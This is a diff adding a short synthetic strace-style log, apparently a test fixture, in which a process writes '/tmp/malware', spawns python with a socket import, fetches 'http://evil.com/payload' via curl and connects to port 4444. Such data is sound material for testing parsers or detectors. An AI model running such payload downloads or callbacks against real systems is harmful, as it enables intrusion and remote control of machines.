@@ -1,0 +1,12 @@
+[pid 1234] connect(4, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("151.101.1.194")}, 16) = -1 EINPROGRESS (Operation now in progress)
+[pid 1234] connect(5, {sa_family=AF_INET6, sin6_port=htons(80), sin6_flowinfo=htonl(0), inet_pton(AF_INET6, "2001:db8::1", &sin6_addr), sin6_scope_id=0}, 28) = 0
+[pid 1234] openat(AT_FDCWD, "/proc/self/maps", O_RDONLY) = 3
+[pid 1234] openat(AT_FDCWD, "/tmp/malware", O_WRONLY|O_CREAT, 0755) = 7
+[pid 1234] execve("/usr/bin/python3", ["/usr/bin/python3", "-c", "import socket"], /* 20 vars */) = 0
+[pid 1234] clone(child_stack=0, flags=CLONE_VM|CLONE_FS|CLONE_FILES|SIGCHLD) = 9999
+[pid 1234] write(4, "\x89PNG\r\n\x1a\n", 8) = 8
+[pid 1234] connect(7, <unfinished ...>
+[pid 9999] execve("/bin/curl", ["/bin/curl", "-s", "http://evil.com/payload"], 0x7fff12345678 /* 10 vars */) = 0
+[pid 1234] <... connect resumed> {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("10.0.0.1")}, 16) = 0
+[pid 1234] +++ exited with 1 +++
+[pid 9999] +++ exited with 0 +++
